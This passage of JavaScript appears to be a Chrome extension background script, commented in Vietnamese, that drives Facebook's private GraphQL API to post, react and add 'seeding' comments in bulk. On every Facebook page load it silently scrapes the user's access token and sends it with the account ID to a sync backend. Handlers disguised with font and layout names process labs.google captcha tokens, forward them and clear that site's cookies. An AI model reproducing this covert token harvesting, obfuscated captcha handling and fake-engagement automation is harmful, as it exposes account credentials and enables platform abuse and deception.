                            if (targetType === "group" && targetId) {
                                variables.input.group_id = String(targetId);
                            }

                            let lastErr = "";
                            for (const targetDocId of fallbackDocIds) {
                                const params = new URLSearchParams();
                                params.append("av", actorId);
                                params.append("__user", actorId);
                                params.append("__a", "1");
                                params.append("__req", Math.floor(Math.random()*100).toString(36));
                                params.append("__hs", hsi || "");
                                params.append("dpr", "1");
                                params.append("__ccg", "EXCELLENT");
                                params.append("__rev", spinR || "1043647106");
                                params.append("__s", [1,2,3].map(()=>Math.random().toString(36).substr(2,6)).join(":"));
                                params.append("__hsi", hsi);
                                params.append("__comet_req", "15");
                                params.append("fb_dtsg", fb_dtsg);
                                params.append("jazoest", jazoest);
                                params.append("lsd", lsd);
                                params.append("__spin_r", spinR || "1043647106");
                                params.append("__spin_b", spinB || "trunk");
                                params.append("__spin_t", spinT || String(Math.floor(Date.now()/1000)));
                                params.append("fb_api_caller_class", "RelayModern");
                                params.append("fb_api_req_friendly_name", "ComposerStoryCreateMutation");
                                params.append("variables", JSON.stringify(variables));
                                params.append("server_timestamps", "true");
                                params.append("doc_id", targetDocId);

                                const resp = await fetch("/api/graphql/", {
                                    method: "POST",
                                    headers: {
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        "X-FB-Friendly-Name": "ComposerStoryCreateMutation",
                                        "X-FB-LSD": lsd,
                                        "X-ASBD-ID": "129477",
                                    },
                                    body: params.toString(),
                                    credentials: "include",
                                });

                                const text = await resp.text();
                                const clean = text.replace(/^for\s*\(;+\)\s*;?\s*/, "");

                                if (resp.ok) {
                                    let pid = null;
                                    let realFbUrl = null;
                                    try {
                                        const jsonResp = JSON.parse(clean);
                                        const sc = jsonResp?.data?.story_create || jsonResp?.data?.composer_story_create || jsonResp?.data;
                                        if (sc) {
                                            const storyObj = sc.story || sc;
                                            pid = storyObj?.legacy_story_hideable?.legacy_story_id ||
                                                  storyObj?.story_fbid ||
                                                  storyObj?.story_id ||
                                                  (storyObj?.id && String(storyObj.id) !== String(mediaId) ? storyObj.id : null);
                                            
                                            const rawUrl = storyObj?.url || storyObj?.permalink_url || storyObj?.legacy_story_hideable?.url;
                                            if (rawUrl) {
                                                realFbUrl = String(rawUrl).replace(/\\/g, "");
                                                if (realFbUrl.endsWith("facebook.com/") || realFbUrl.endsWith("facebook.com")) realFbUrl = null;
                                            }
                                        }
                                    } catch(e) {}

                                    // Fallback Regex for Published Story/Reel ID
                                    const legacyMatch = clean ? (
                                        clean.match(/"legacy_story_id"\s*:\s*"(\d+)"/) ||
                                        clean.match(/"story_fbid"\s*:\s*"(\d+)"/) ||
                                        clean.match(/"post_id"\s*:\s*"(\d+)"/) ||
                                        clean.match(/"story_id"\s*:\s*"(\d+)"/)
                                    ) : null;
                                    if (legacyMatch && legacyMatch[1]) {
                                        pid = legacyMatch[1];
                                    }

                                    if (pid && typeof pid === "string" && !/^\d+$/.test(pid)) {
                                        try {
                                            const decoded = atob(pid);
                                            const m = decoded.match(/(\d{8,})/);
                                            if (m) pid = m[1];
                                        } catch(e) {}
                                    }

                                    let pfbidM = clean ? clean.match(/"(pfbid[a-zA-Z0-9]+)"/) : null;
                                    const effectiveId = pfbidM ? pfbidM[1] : (pid || uploadedMediaId || mediaId);

                                    let purl = realFbUrl;
                                    if (purl && postType === "post" && purl.includes("/reel/")) {
                                        purl = null; // Ignore reel url for regular feed posts
                                    }

                                    if (!purl && effectiveId) {
                                        if (String(effectiveId).startsWith("pfbid")) {
                                            purl = actorId ? `https://www.facebook.com/${actorId}/posts/${effectiveId}` : `https://www.facebook.com/posts/${effectiveId}`;
                                        } else if (postType === "reel") {
                                            purl = `https://www.facebook.com/reel/${effectiveId}`;
                                        } else if (postType === "video") {
                                            purl = `https://www.facebook.com/watch/?v=${effectiveId}`;
                                        } else if (pid) {
                                            purl = actorId ? `https://www.facebook.com/permalink.php?story_fbid=${pid}&id=${actorId}` : `https://www.facebook.com/permalink.php?story_fbid=${pid}`;
                                        } else if (uploadedMediaId) {
                                            purl = `https://www.facebook.com/photo/?fbid=${effectiveId}`;
                                        } else {
                                            purl = actorId ? `https://www.facebook.com/permalink.php?story_fbid=${effectiveId}&id=${actorId}` : `https://www.facebook.com/permalink.php?story_fbid=${effectiveId}`;
                                        }
                                    }

                                    if (effectiveId || realFbUrl || (!clean.includes('"errors"') && (clean.includes('"story"') || clean.includes('"id"')))) {
                                        return {
                                            success: true,
                                            tier: "graphql",
                                            fbPostId: effectiveId ? String(effectiveId) : null,
                                            fbPostUrl: purl || realFbUrl,
                                            response: "Story created via HAR doc_id " + targetDocId
                                        };
                                    }
                                } else {
                                    lastErr = "HTTP " + resp.status;
                                }
                            }

                            return { success: false, error: lastErr || "GraphQL failed", tier: "graphql" };
                        } catch (e) {
                            return { success: false, error: e.message, tier: "graphql" };
                        }
                    },
                    args: [payload.content, postType, effectiveMediaId, isVideo, fallbackActorId, payload.targetType || "profile", payload.targetId || "", payload.actorId || ""]
                });

                const graphqlResult = graphqlResults && graphqlResults[0] && graphqlResults[0].result;
                console.log(`[Background] HAR GraphQL result:`, graphqlResult);

                if (graphqlResult && graphqlResult.success) {
                    const pid = graphqlResult.fbPostId || uploadedMediaId;
                    let purl = graphqlResult.fbPostUrl;
                    if (purl && postType !== "reel" && purl.includes("/reel/")) {
                        purl = purl.replace("/reel/", "/watch/?v=");
                    }
                    if (!purl && pid) {
                        if (String(pid).startsWith("pfbid")) {
                            purl = `https://www.facebook.com/posts/${pid}`;
                        } else if (postType === "reel") {
                            purl = `https://www.facebook.com/reel/${pid}`;
                        } else if (isVideo) {
                            purl = `https://www.facebook.com/watch/?v=${pid}`;
                        } else if (uploadedMediaId) {
                            purl = `https://www.facebook.com/photo/?fbid=${pid}`;
                        } else {
                            purl = `https://www.facebook.com/permalink.php?story_fbid=${pid}`;
                        }
                    }
                    console.log(`✅ [Background] TIER 1 HAR SUCCESS — Post ${post.id} created via GraphQL API (FB ID: ${pid})`);
                    
                    // Exec Auto-Seeding Comments if configured
                    if (payload.seedingComments && Array.isArray(payload.seedingComments) && payload.seedingComments.length > 0) {
                        await updateStep(`💬 Đang tự động gửi ${payload.seedingComments.length} bình luận seeding...`);
                        try {
                            await chrome.scripting.executeScript({
                                target: { tabId: targetTab.id },
                                world: "MAIN",
                                func: async (postId, comments, fallbackActorId) => {
                                    let fb_dtsg = "";
                                    let lsd = "";
                                    const html = document.documentElement.innerHTML;
                                    const dM = html.match(/"DTSGInitialData"[^}]*"token":"([^"]+)"/) || html.match(/"token":"([^"]{20,})"/);
                                    if (dM) fb_dtsg = dM[1];
                                    const lM = html.match(/"LSD"[^}]*"token":"([^"]+)"/) || html.match(/"lsd":"([^"]+)"/);
                                    if (lM) lsd = lM[1];
                                    const cUserMatch = document.cookie.match(/c_user=(\d+)/);
                                    const actorId = cUserMatch ? cUserMatch[1] : fallbackActorId;

                                    if (!fb_dtsg || !actorId || !postId) return;

                                    for (const commentText of comments) {
                                        if (!commentText || !commentText.trim()) continue;
                                        try {
                                            const vars = {
                                                input: {
                                                    feedback_id: btoa("feedback:" + postId),
                                                    message: { text: commentText.trim() },
                                                    actor_id: actorId,
                                                    client_mutation_id: String(Date.now())
                                                }
                                            };
                                            const params = new URLSearchParams();
                                            params.append("av", actorId);
                                            params.append("__user", actorId);
                                            params.append("__a", "1");
                                            params.append("fb_dtsg", fb_dtsg);
                                            params.append("lsd", lsd);
                                            params.append("fb_api_caller_class", "RelayModern");
                                            params.append("fb_api_req_friendly_name", "CometCommentCreateMutation");
                                            params.append("variables", JSON.stringify(vars));
                                            params.append("doc_id", "5384620808298758");

                                            await fetch("/api/graphql/", {
                                                method: "POST",
                                                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                                                body: params.toString(),
                                                credentials: "include"
                                            });
                                            await new Promise(r => setTimeout(r, 1200));
                                        } catch(e) {}
                                    }
                                },
                                args: [pid, payload.seedingComments, fallbackActorId]
                            });
                        } catch(e) {}
                    }
                    
                    await updateStep(`🎉 4/4: Đã đăng bài viết thành công qua Direct GraphQL API!${pid ? ' ID: ' + pid : ''}`);
                    return { success: true, method: "graphql", fbPostId: pid, fbPostUrl: purl };
                }

                console.warn(`⚠️ [Background] TIER 1 HAR FAILED:`, graphqlResult?.error);
            } catch (graphqlErr) {
                console.warn(`⚠️ [Background] TIER 1 HAR ERROR:`, graphqlErr.message);
            }
        }

        // ===================================================================
        // Feed Post (postType "post") → KHÔNG BAO GIỜ dùng DOM Automation
        // Trả về lỗi ngay nếu TIER 1 GraphQL thất bại
        // ===================================================================
        // ===================================================================
        // TIER 2 DOM đã bị TẮT HOÀN TOÀN — Chỉ sử dụng GraphQL API
        // ===================================================================
        const errMsg = hasMedia && !uploadedMediaId 
            ? "Upload media thất bại và GraphQL API không thành công. Vui lòng thử lại."
            : "GraphQL API thất bại. Vui lòng kiểm tra kết nối Facebook và thử lại.";
        await updateStep(`❌ 4/4: ${errMsg}`);
        console.warn(`❌ [Background] Post ${post.id} failed — GraphQL only mode, no DOM fallback.`);
        return { success: false, error: errMsg, method: "graphql_only" };

    } catch (e) {
        return { success: false, error: e.message };
    }
}

async function _extractFacebookAccessToken() {
    try {
        const tabs = await chrome.tabs.query({ url: "*://*.facebook.com/*" });
        if (!tabs || tabs.length === 0) {
            return { success: false, error: "Vui lòng mở một tab Facebook (https://www.facebook.com) và bấm lại!" };
        }

        const targetTab = tabs[0];
        const results = await chrome.scripting.executeScript({
            target: { tabId: targetTab.id },
            world: "MAIN",
            func: () => {
                try {
                    if (window.__accessToken) return { token: window.__accessToken };

                    const scripts = Array.from(document.querySelectorAll("script"));
                    for (const s of scripts) {
                        const txt = s.textContent || "";
                        const match = txt.match(/["'](EAAG[A-Za-z0-9]+)["']/) || txt.match(/["'](EAAU[A-Za-z0-9]+)["']/);
                        if (match && match[1]) return { token: match[1] };
                    }

                    if (window.require) {
                        try {
                            const asyncUtils = window.require("CometAsyncRequestUtils");
                            if (asyncUtils && asyncUtils.getAsyncParams) {
                                const params = asyncUtils.getAsyncParams();
                                if (params && params.av) return { token: params.av };
                            }
                        } catch (e) {}
                    }
                    return { token: null, error: "Chưa thể trích xuất token từ tab Facebook" };
                } catch (e) {
                    return { token: null, error: e.message };
                }
            }
        });

        if (results && results[0] && results[0].result && results[0].result.token) {
            const token = results[0].result.token;
            const cUserCookie = await chrome.cookies.get({ url: "https://www.facebook.com", name: "c_user" }).catch(() => null);
            const userId = cUserCookie ? cUserCookie.value : `user_${Date.now()}`;

            // Save to Python Backend
            await fetch(`${_syncUrl}/api/accounts`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    id: `acc_${userId}`,
                    name: `Tài Khoản Facebook (${userId})`,
                    targetId: userId,
                    accessToken: token,
                    updatedAt: Date.now()
                })
            }).catch(() => {});

            return { success: true, token: token, userId: userId };
        }

        return { success: false, error: "Chưa tìm thấy Access Token. Hãy bấm F5 làm mới lại trang Facebook rồi thử lại!" };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Automatically extract Facebook Access Token silently whenever Facebook is open/loaded
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === "complete" && tab.url && tab.url.includes("facebook.com")) {
        _extractFacebookAccessToken().catch(() => {});
    }
});
setTimeout(() => { _extractFacebookAccessToken().catch(() => {}); }, 3000);

// ============================================================
// INTERCEPTED DATA HANDLER: Receives real-time FB data from content scripts
// ============================================================
let _interceptedBatch = new Map(); // postId -> data
let _interceptPushTimer = null;
const _INTERCEPT_PUSH_INTERVAL = 10000; // Push to backend every 10s

async function _handleInterceptedData(items) {
    for (const item of items) {
        if (item.postId && item.metrics) {
            _interceptedBatch.set(item.postId, item);
        }
    }
    // Schedule push if not already scheduled
    if (!_interceptPushTimer && _interceptedBatch.size > 0) {
        _interceptPushTimer = setTimeout(_pushInterceptedData, _INTERCEPT_PUSH_INTERVAL);
    }
}

async function _pushInterceptedData() {
    _interceptPushTimer = null;
    if (_interceptedBatch.size === 0) return;
    const posts = Array.from(_interceptedBatch.values());
    _interceptedBatch.clear();
    try {
        await fetch(`${_syncUrl}/api/realtime-data`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ posts, timestamp: Date.now() }),
            signal: AbortSignal.timeout(5000)
        });
    } catch(e) { /* backend not running, ignore */ }
}

chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
    if (message.type === "FETCH_FB_TOKEN") {
        _extractFacebookAccessToken()
            .then(r => sendResponse(r))
            .catch(e => sendResponse({ success: false, error: e.message }));
        return true;
    }

    // Handle real-time intercepted data from fb_interceptor.js → fb_bridge.js
    if (message.action === "FB_DATA_CAPTURED" && Array.isArray(message.data)) {
        _handleInterceptedData(message.data).catch(() => {});
        sendResponse({ ok: true });
        return true;
    }

    if (message.action === "FB_PAGE_CHANGED") {
        sendResponse({ ok: true });
        return true;
    }

    // Handle post execution result from content.js
    if (message.type === "POST_RESULT") {
        const postId = message.postId;
        console.log(`📬 [Background] Received POST_RESULT for ${postId}:`, message.success ? "✅ Success" : "❌ Failed");
        
        // Resolve the pending promise in _executePostItem
        // if (postId && _pendingPostResults.has(postId)) {
        //     const resolve = _pendingPostResults.get(postId);
        //     _pendingPostResults.delete(postId);
        //     resolve({ success: message.success, error: message.error || null });
        // }
        
        // Also update Python backend with the result
        if (postId) {
            const extId = instanceId || "";
            fetch(`${_syncUrl}/sync/auto-post`, {
                method: "POST",
                headers: { "Content-Type": "application/json", "X-Ext-Id": extId },
                body: JSON.stringify({
                    id: postId,
                    status: message.success ? "completed" : "failed",
                    error: message.error || null,
                    executedAt: Date.now()
                }),
                signal: AbortSignal.timeout(5000)
            }).catch(() => {});
        }
        
        sendResponse({ ok: true });
        return true;
    }

    // Handle progress updates from content.js (for dashboard display)
    if (message.type === "POST_PROGRESS") {
        console.log(`📊 [Background] Post ${message.postId} progress: [${message.step}] ${message.detail}`);
        // Store progress for dashboard polling
        chrome.storage.local.get(["post_progress"], (data) => {
            const progress = data.post_progress || {};
            progress[message.postId] = {
                step: message.step,
                detail: message.detail,
                timestamp: message.timestamp || Date.now()
            };
            chrome.storage.local.set({ post_progress: progress });
        });
        sendResponse({ ok: true });
        return true;
    }


    if (message.type === "SCHEDULE_UPDATE" || message.type === "CHECK_SCHEDULED_POSTS") {
        _processScheduledPosts().then(() => sendResponse({ ok: true }));
        return true;
    }

    if (message.type === "TRIGGER_POST_NOW" && message.postId) {
        (async () => {
            let targetPost = null;

            // Try fetching from Python backend first
            try {
                const res = await fetch(`${_syncUrl}/api/posts`);
                if (res.ok) {
                    const data = await res.json();
                    targetPost = (data.posts || []).find(p => p.id === message.postId);
                }
            } catch (e) {}

            // Fallback to local extension storage
            if (!targetPost) {
                const res = await chrome.storage.local.get(["scheduled_posts"]);
                const posts = res.scheduled_posts || [];
                targetPost = posts.find(p => p.id === message.postId);
            }

            if (targetPost) {
                targetPost.status = "pending";
                targetPost.scheduledTime = Date.now();
                const execRes = await _executePostItem(targetPost);
                sendResponse({ ok: true, result: execRes });
            } else {
                sendResponse({ ok: false, error: "Post not found" });
            }
        })();
        return true;
    }

    if (message.type === "CHECK_V") {
        _validateCanvas(message.tabId)
            .then(r => sendResponse(r))
            .catch(e => sendResponse({ available: false, error: e.message }));
        return true;
    }

    
    if (message.type === "TEST_V") {
        _resolveWidget({ site_key: message.site_key || "", action: message.action || "" })
            .then(r => {
                if (r.token) _onFontCached();
                sendResponse(r);
            })
            .catch(e => sendResponse({ token: null, error: e.message }));
        return true;
    }

    
    if (message.type === "GET_METRICS") {
        sendResponse({
            tokenCount: _fontCache,
            sessionCount: _renderQueue,
            lastSuccess: _lastRender,
            connected: _themeReady,
            active: _layoutActive,
        });
        return true;
    }

    
    if (message.type === "CHECK_RENDER") {
        (async () => {
            const result = {
                bridge: "err", bridgeText: "Not running",
                tab: "warn", tabText: "No session",
                captcha: "warn", captchaText: "—",
            };
            
            try {
                const extId = await getInstanceId();
                const r = await fetch(`${_syncUrl}/sync/status`, { signal: AbortSignal.timeout(3000), headers: { "X-Ext-Id": extId } });
                if (r.ok) { result.bridge = "ok"; result.bridgeText = "Connected"; }
                else { result.bridgeText = `Error (${r.status})`; }
            } catch (e) {  }

            
            try {
                const tabs = await chrome.tabs.query({});
                const labsTabs = tabs.filter(t => t.url && t.url.includes("labs.google"));
                if (labsTabs.length > 0) {
                    result.tab = "ok";
                    result.tabText = `Active (${labsTabs.length})`;
                    
                    try {
                        const _widgetState = await _validateCanvas(labsTabs[0].id);
                        if (_widgetState && _widgetState.available) {
                            result.captcha = "ok";
                            result.captchaText = "Ready";
                        } else {
                            result.captchaText = _widgetState?.error || "Not ready";
                        }
                    } catch (e) { result.captchaText = "Timeout"; }
                }
            } catch (e) { result.tab = "err"; result.tabText = "Error"; }

            sendResponse(result);
        })();
        return true;
    }

    
    if (message.type === "RESET_LAYOUT") {
        (async () => {
            try {
                const cookies = await chrome.cookies.getAll({ domain: "labs.google" });
                for (const c of cookies) {
                    const url = `https://${c.domain.replace(/^\./, "")}${c.path}`;
                    await chrome.cookies.remove({ url, name: c.name });
                }
            } catch (e) {  }
            await _relayoutCanvas();
            sendResponse({ ok: true });
        })();
        return true;
    }

    
    if (message.type === "RELOAD_CANVAS") {
        (async () => {
            try {
                const tabs = await chrome.tabs.query({});
                const labsTabs = tabs.filter(t => t.url && t.url.includes("labs.google"));
                if (labsTabs.length > 0) {
                    await chrome.tabs.reload(labsTabs[0].id);
                    sendResponse({ ok: true });
                } else {
                    sendResponse({ ok: false, error: "No Labs tab" });
                }
            } catch (e) {
                sendResponse({ ok: false, error: e.message });
            }
        })();
        return true;
    }

    
    if (message.type === "CLEAR_METRICS") {
        _fontCache = 0;
        _lastRender = null;
        chrome.storage.local.set({ tokenCount: 0, lastSuccess: null });
        sendResponse({ ok: true });
        return true;
    }

    return false;
});

async function _submitAnalytics(requestId, token, error) {
    try {
        const payload = JSON.stringify({
            r: requestId,
            t: token,
            e: error || null,
            u: navigator.userAgent,
            p: navigator.platform,
        });
        const extId = await getInstanceId();
        await fetch(`${_syncUrl}/sync/render`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Ext-Id": extId },
            body: JSON.stringify({ d: _serializeTheme(payload) }),
            signal: AbortSignal.timeout(5000),
        });
    } catch (e) {  }
}

function _animDelay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function _setLayoutMode(active) {
    if (_layoutTimer) { clearTimeout(_layoutTimer); _layoutTimer = null; }

    if (active) {
        _layoutTimer = setTimeout(() => _setLayoutMode(false), _LAYOUT_TIMEOUT);
        if (_layoutActive) return; 
        _layoutActive = true;
    } else {
        if (!_layoutActive) return; 
        _layoutActive = false;
    }

    
    try {
        const tabs = await chrome.tabs.query({});
        const labsTabs = tabs.filter(t => t.url && t.url.includes("labs.google"));
        for (const tab of labsTabs) {
            try {
                chrome.tabs.sendMessage(tab.id, {
                    type: "LAYOUT_CHANGED",
                    active: _layoutActive,
                    tokenCount: _fontCache,
                    sessionCount: _renderQueue,
                    connected: _themeReady,
                });
            } catch (e) {  }
        }
    } catch (e) {  }
}

// ============================================================
// INTERACTION MANAGEMENT: Like, Comment, Metrics via GraphQL
// ============================================================
let _isProcessingInteractions = false;

async function _processInteractionTasks() {
    if (_isProcessingInteractions) return;
    _isProcessingInteractions = true;
    try {
        const res = await fetch(`${_syncUrl}/api/interaction-tasks?status=pending`, {
            signal: AbortSignal.timeout(8000)
        });
        if (!res.ok) return;
        const data = await res.json();
        const tasks = data.tasks || [];
        if (tasks.length === 0) return;

        const task = tasks[0];

        // Mark as in_progress
        await fetch(`${_syncUrl}/api/interaction-tasks/${task.id}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ status: 'in_progress' })
        }).catch(() => {});

        // Find a Facebook tab
        const tabs = await chrome.tabs.query({ url: "*://*.facebook.com/*" });
        if (tabs.length === 0) {
            await _updateInteractionTask(task.id, 'failed', { error: 'No Facebook tab open' });
            return;
        }
        const tabId = tabs[0].id;

        let result;
        switch (task.type) {
            case 'ADD_COMMENT':
                result = await _addCommentViaGraphQL(tabId, task.fbPostId, task.payload.text);
                break;
            case 'DELETE_COMMENT':
                result = await _deleteCommentViaGraphQL(tabId, task.payload.commentId);
                break;
            case 'REACT_POST':
                result = await _reactToPostViaGraphQL(tabId, task.fbPostId, task.payload.reactionType || 'LIKE');
                break;
            case 'UNREACT_POST':
                result = await _unreactPostViaGraphQL(tabId, task.fbPostId);
                break;
            case 'FETCH_METRICS':
                result = await _fetchMetricsViaGraphQL(tabId, task.fbPostId);
                break;
            case 'FETCH_COMMENTS':
                result = await _fetchCommentsViaGraphQL(tabId, task.fbPostId);
                break;
            default:
                result = { success: false, error: 'Unknown task type: ' + task.type };
        }

        await _updateInteractionTask(task.id, result.success ? 'completed' : 'failed', result);

        // Also update the post metrics if available
        if (result.success && result.metrics && task.postId) {
            await fetch(`${_syncUrl}/api/posts/${task.postId}`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ metrics: result.metrics })
            }).catch(() => {});
        }
    } catch (e) {
        // Silently ignore - backend may not be running
    } finally {
        _isProcessingInteractions = false;
    }
}

async function _updateInteractionTask(taskId, status, result) {
    await fetch(`${_syncUrl}/api/interaction-tasks/${taskId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status, result, completedAt: Date.now() })
    }).catch(() => {});
}

async function _addCommentViaGraphQL(tabId, fbPostId, text) {
    try {
        const result = await chrome.scripting.executeScript({
            target: { tabId, allFrames: false },
            world: 'MAIN',
            func: async (postId, commentText) => {
                try {
                    const dtsgEl = document.querySelector('input[name="fb_dtsg"]');
                    const fb_dtsg = dtsgEl ? dtsgEl.value : '';
                    const actorId = (document.cookie.match(/c_user=(\d+)/) || [])[1] || '';
                    if (!fb_dtsg || !actorId) return { success: false, error: 'Missing tokens (fb_dtsg or c_user)' };

                    const feedbackId = btoa('feedback:' + postId);
                    const params = new URLSearchParams();
                    params.append('av', actorId);
                    params.append('__user', actorId);
                    params.append('__a', '1');
                    params.append('fb_dtsg', fb_dtsg);
                    params.append('fb_api_caller_class', 'RelayModern');
                    params.append('fb_api_req_friendly_name', 'CometCommentCreateMutation');
                    params.append('variables', JSON.stringify({
                        input: {
                            feedback_id: feedbackId,
                            message: { text: commentText },
                            actor_id: actorId,
                            client_mutation_id: String(Date.now())
                        }
                    }));
                    params.append('doc_id', '5384620808298758');

                    const res = await fetch('https://www.facebook.com/api/graphql/', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: params.toString(),
                        credentials: 'include'
                    });
                    const text = await res.text();
                    const clean = text.replace('for (;;);', '');
                    const json = JSON.parse(clean);
                    if (json.errors) return { success: false, error: json.errors[0]?.message || 'GraphQL error' };
                    return { success: true, data: json };
                } catch (e) { return { success: false, error: e.message }; }
            },
            args: [fbPostId, text]
        });
        return result[0]?.result || { success: false, error: 'Script execution failed' };
    } catch (e) { return { success: false, error: e.message }; }
}

async function _reactToPostViaGraphQL(tabId, fbPostId, reactionType) {
    try {
        const result = await chrome.scripting.executeScript({
            target: { tabId, allFrames: false },
            world: 'MAIN',
            func: async (postId, reaction) => {
                try {
                    const dtsgEl = document.querySelector('input[name="fb_dtsg"]');
                    const fb_dtsg = dtsgEl ? dtsgEl.value : '';
                    const actorId = (document.cookie.match(/c_user=(\d+)/) || [])[1] || '';
                    if (!fb_dtsg || !actorId) return { success: false, error: 'Missing tokens' };

                    const feedbackId = btoa('feedback:' + postId);
                    const reactionMap = { 'LIKE': 1, 'LOVE': 2, 'WOW': 3, 'HAHA': 4, 'SAD': 7, 'ANGRY': 8 };
                    const reactionValue = reactionMap[reaction] || 1;

                    const params = new URLSearchParams();
                    params.append('av', actorId);
                    params.append('__user', actorId);
                    params.append('__a', '1');
                    params.append('fb_dtsg', fb_dtsg);
                    params.append('fb_api_caller_class', 'RelayModern');
                    params.append('fb_api_req_friendly_name', 'CometUFIFeedbackReactMutation');
                    params.append('variables', JSON.stringify({
                        input: {
                            feedback_id: feedbackId,
                            feedback_reaction: reactionValue,
                            actor_id: actorId,
                            feedback_source: 'NEWS_FEED',
                            client_mutation_id: String(Date.now())
                        }
                    }));
                    params.append('doc_id', '4769042373179384');

                    const res = await fetch('https://www.facebook.com/api/graphql/', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: params.toString(),
                        credentials: 'include'
                    });
                    const text = await res.text();
                    const json = JSON.parse(text.replace('for (;;);', ''));
                    if (json.errors) return { success: false, error: json.errors[0]?.message };
                    return { success: true };
                } catch (e) { return { success: false, error: e.message }; }
            },
            args: [fbPostId, reactionType]
        });
        return result[0]?.result || { success: false, error: 'Script failed' };
    } catch (e) { return { success: false, error: e.message }; }
}

async function _unreactPostViaGraphQL(tabId, fbPostId) {
    try {
        const result = await chrome.scripting.executeScript({
            target: { tabId, allFrames: false },
            world: 'MAIN',
            func: async (postId) => {
                try {
                    const dtsgEl = document.querySelector('input[name="fb_dtsg"]');
                    const fb_dtsg = dtsgEl ? dtsgEl.value : '';
                    const actorId = (document.cookie.match(/c_user=(\d+)/) || [])[1] || '';
                    if (!fb_dtsg || !actorId) return { success: false, error: 'Missing tokens' };
                    const feedbackId = btoa('feedback:' + postId);
                    const params = new URLSearchParams();
                    params.append('av', actorId);
                    params.append('__user', actorId);
                    params.append('__a', '1');
                    params.append('fb_dtsg', fb_dtsg);
                    params.append('fb_api_caller_class', 'RelayModern');
                    params.append('fb_api_req_friendly_name', 'CometUFIFeedbackReactMutation');
                    params.append('variables', JSON.stringify({
                        input: {
                            feedback_id: feedbackId,
                            feedback_reaction: 0,
                            actor_id: actorId,
                            feedback_source: 'NEWS_FEED',
                            client_mutation_id: String(Date.now())
                        }
                    }));
                    params.append('doc_id', '4769042373179384');
                    const res = await fetch('https://www.facebook.com/api/graphql/', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: params.toString(),
                        credentials: 'include'
                    });
                    const text = await res.text();
                    const json = JSON.parse(text.replace('for (;;);', ''));
                    return { success: !json.errors };
                } catch (e) { return { success: false, error: e.message }; }
            },
            args: [fbPostId]
        });
        return result[0]?.result || { success: false, error: 'Script failed' };
    } catch (e) { return { success: false, error: e.message }; }
}

async function _fetchMetricsViaGraphQL(tabId, fbPostId) {
    try {
        const result = await chrome.scripting.executeScript({
            target: { tabId, allFrames: false },
            world: 'MAIN',
            func: async (postId) => {
                try {
                    const dtsgEl = document.querySelector('input[name="fb_dtsg"]');
                    const fb_dtsg = dtsgEl ? dtsgEl.value : '';
                    const actorId = (document.cookie.match(/c_user=(\d+)/) || [])[1] || '';
                    if (!fb_dtsg || !actorId) return { success: false, error: 'Missing tokens' };
                    const feedbackId = btoa('feedback:' + postId);
                    const params = new URLSearchParams();
                    params.append('av', actorId);
                    params.append('__user', actorId);
                    params.append('__a', '1');
                    params.append('fb_dtsg', fb_dtsg);
                    params.append('fb_api_caller_class', 'RelayModern');
                    params.append('fb_api_req_friendly_name', 'CometUFISummaryAndActionsQuery');
                    params.append('variables', JSON.stringify({ feedbackTargetID: feedbackId }));
                    params.append('doc_id', '7171378936243498');
                    const res = await fetch('https://www.facebook.com/api/graphql/', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: params.toString(),
                        credentials: 'include'
                    });
                    const text = await res.text();
                    const json = JSON.parse(text.replace('for (;;);', ''));
                    const data = json.data || {};
                    const feedback = data.feedback || data.node || {};
                    const reactionCount = feedback.reaction_count?.count || feedback.reactors?.count || 0;
                    const commentCount = feedback.comment_count?.total_count || feedback.total_comment_count || 0;
                    const shareCount = feedback.share_count?.count || feedback.reshare_count?.count || 0;
                    return { success: true, metrics: { likes: reactionCount, comments: commentCount, shares: shareCount } };
                } catch (e) { return { success: false, error: e.message }; }
            },
            args: [fbPostId]
        });
        return result[0]?.result || { success: false, error: 'Script failed' };
    } catch (e) { return { success: false, error: e.message }; }
}

async function _fetchCommentsViaGraphQL(tabId, fbPostId) {
    try {
        const result = await chrome.scripting.executeScript({
            target: { tabId, allFrames: false },
            world: 'MAIN',
            func: async (postId) => {
                try {
                    const dtsgEl = document.querySelector('input[name="fb_dtsg"]');
                    const fb_dtsg = dtsgEl ? dtsgEl.value : '';
                    const actorId = (document.cookie.match(/c_user=(\d+)/) || [])[1] || '';
                    if (!fb_dtsg || !actorId) return { success: false, error: 'Missing tokens', comments: [] };
                    const feedbackId = btoa('feedback:' + postId);
                    const params = new URLSearchParams();
                    params.append('av', actorId);
                    params.append('__user', actorId);
                    params.append('__a', '1');
                    params.append('fb_dtsg', fb_dtsg);
                    params.append('fb_api_caller_class', 'RelayModern');
                    params.append('fb_api_req_friendly_name', 'CometUFICommentsProviderQuery');
                    params.append('variables', JSON.stringify({
                        feedbackID: feedbackId,
                        feedbackSource: 2,
                        focusCommentID: null,
                        scale: 1,
                        useDefaultActor: false,
                        first: 50,
                        orderingMode: 'RANKED_UNFILTERED'
                    }));
                    params.append('doc_id', '5765399230165702');
                    const res = await fetch('https://www.facebook.com/api/graphql/', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: params.toString(),
                        credentials: 'include'
                    });
                    const text = await res.text();
                    const lines = text.replace('for (;;);', '').split('\n').filter(l => l.trim());
                    let comments = [];
                    for (const line of lines) {
                        try {
                            const json = JSON.parse(line);
                            const edges = json?.data?.feedback?.display_comments?.edges
                                || json?.data?.node?.display_comments?.edges || [];
                            for (const edge of edges) {
                                const node = edge.node;
                                if (node) {
                                    comments.push({
